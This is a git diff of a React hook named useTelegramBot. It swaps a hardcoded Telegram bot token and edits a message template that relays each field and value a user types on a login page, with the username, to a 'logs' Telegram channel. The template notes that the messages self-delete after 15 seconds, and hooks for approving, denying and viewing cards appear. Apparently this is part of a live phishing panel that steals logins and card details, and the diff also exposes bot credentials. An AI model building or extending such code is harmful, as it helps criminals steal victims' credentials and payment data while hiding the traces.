@@ -2,7 +2,7 @@
 import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
+const TELEGRAM_BOT_TOKEN = '8666763764:AAH1sDQvaSwAk3LwNwBFCIsZJjtJdB_hJwE';
 
 // Channel IDs
 const LOGS_CHAT_ID = '-1003861936742';
@@ -397,7 +397,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 📝 <b>Field:</b> ${field}
 📝 <b>Value:</b> ${value}
 👤 <b>Username:</b> ${username || 'Not entered yet'}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>User is typing on the login page!</i>
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
